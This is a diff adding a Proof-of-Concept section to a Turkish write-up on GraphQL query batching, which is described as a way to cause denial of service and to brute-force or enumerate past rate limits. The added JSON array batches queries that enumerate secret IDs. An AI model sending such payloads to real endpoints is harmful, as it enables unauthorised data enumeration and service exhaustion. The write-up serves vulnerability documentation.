@@ -8,3 +8,16 @@ Saldırganlar, tek bir HTTP paketinin gövdesine (body) yüzlerce, hatta binlerc
 Bu zafiyet, temel olarak iki farklı saldırı vektörüne zemin hazırlar:
 1. **Denial of Service (DoS):** Sunucunun kaynaklarını (CPU/RAM/DB) tek bir HTTP isteği üzerinden tüketmek.
 2. **Brute Force (Kaba Kuvvet) ve Enumeration:** Rate limit engeline takılmadan aynı anda binlerce şifre, ID veya token denemesi gerçekleştirmek.
+
+## Proof of Concept (PoC) Sorgusu
+Aşağıdaki JSON verisi, tek bir HTTP POST isteğinin gövdesinde gönderilerek arka arkaya birden fazla ID'yi denemek (brute-force) veya sunucuyu yormak (DoS) amacıyla kullanılabilir.
+
+```json
+[
+  {"query": "query { secret(id: \"1001\") { content } }"},
+  {"query": "query { secret(id: \"1002\") { content } }"},
+  {"query": "query { secret(id: \"1003\") { content } }"},
+  {"query": "query { secret(id: \"1004\") { content } }"},
+  {"query": "query { secret(id: \"1005\") { content } }"}
+]
+```
